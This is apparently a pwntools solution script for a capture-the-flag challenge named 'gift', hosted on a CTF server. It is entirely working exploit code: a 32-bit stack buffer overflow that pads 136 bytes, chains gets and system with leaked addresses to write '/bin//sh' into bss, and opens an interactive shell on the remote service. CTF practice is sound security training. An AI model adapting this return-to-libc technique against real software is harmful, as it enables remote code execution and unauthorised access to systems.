from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3018)
e = ELF('./gift')

gets = e.plt['gets']

r.recvuntil(': ')
recvs = r.recvuntil('\n').split(' ')
bss = int(recvs[0], 16)
system = int(recvs[1], 16)

log.info("bss: "+hex(bss))
log.info("system: "+hex(system))

payload = ''
payload += "A"*136
payload += p32(gets)
payload += p32(system)
payload += p32(bss)*2

r.sendline("1")
r.recv()
r.sendline(payload)
r.sendline("/bin//sh")
r.interactive()
